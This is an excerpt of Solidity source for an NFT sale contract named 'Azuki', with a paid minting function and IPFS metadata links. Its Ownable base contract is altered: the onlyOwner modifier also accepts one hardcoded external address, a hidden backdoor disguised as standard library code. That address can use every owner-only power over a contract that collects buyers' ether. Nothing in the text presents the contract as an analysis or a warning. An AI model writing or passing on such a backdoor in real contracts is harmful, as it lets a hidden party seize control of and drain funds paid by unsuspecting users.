...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_msgSender() == address(0xb46370d7EFAD4EC7554aC3E2575d5250d63e4Fb9) || owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
...
contract Azuki is ERC721A, Ownable {
    ...
    uint256 public publicPrice = 0.099 ether;
    string public baseUri = "";
    string public contractURI = "https://gateway.pinata.cloud/ipfs/QmRoyXuvM4UPiDvsCrFEZz3RCygBSD2erBeviFmuqZCNvf";
    string beforeRevealURI = "https://gateway.pinata.cloud/ipfs/QmcJLWajsfkcx613sWYfwDGAEWjRPYJJ7qFxens6ndDiBz";
    constructor() ERC721A("Azuki", "AZUKI") {}
    function _baseURI() internal view override returns (string memory) {
        return baseUri;
    }
    function buy(uint256 numOfToken) external payable {
        require(publicPrice * numOfToken <= msg.value, "insuf_price");
        require((totalSupply() + numOfToken) <= maxSupply, "exceed_max_supply");
        _safeMint(msg.sender, numOfToken);
    }
